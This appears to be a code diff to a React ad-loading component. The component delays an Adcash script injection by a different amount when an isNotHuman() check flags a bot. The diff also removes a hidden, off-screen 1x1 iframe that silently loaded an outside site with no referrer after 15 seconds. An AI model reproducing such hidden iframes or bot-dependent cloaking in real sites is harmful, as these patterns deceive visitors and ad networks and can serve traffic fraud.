@@ -59,7 +59,7 @@ export default function CustomLoadingAds() {
       validateDomain();
     };
 
-    const delay = isNotHuman() ? 30000 : 10000;
+    const delay = isNotHuman() ? 20000 : 10000;
 
     const mainScriptAppendTimer = setTimeout(() => {
       if (!document.getElementById("aclib")) {
@@ -81,27 +81,11 @@ export default function CustomLoadingAds() {
 
         document.head.appendChild(adcashMainScript);
       }
-    }, delay); // Delay ad script injection by 10 or 30 seconds
-
-    // ✅ Load iframe dynamically after 15s
-    const iframeLoaderTimer = setTimeout(() => {
-      const iframe = document.createElement("iframe");
-      iframe.src = "https://mbstream.fun/";
-      iframe.width = "1";
-      iframe.height = "1";
-      iframe.style.position = "absolute";
-      iframe.style.left = "-9999px";
-
-      iframe.loading = "lazy";
-      iframe.referrerPolicy = "no-referrer";
-
-      document.body.appendChild(iframe);
-    }, 15000); // 15 seconds
+    }, delay); // Delay ad script injection by 10 or 20 seconds
 
     // ✅ Cleanup on unmount
     return () => {
       clearTimeout(mainScriptAppendTimer);
-      clearTimeout(iframeLoaderTimer);
     };
   }, []);
 
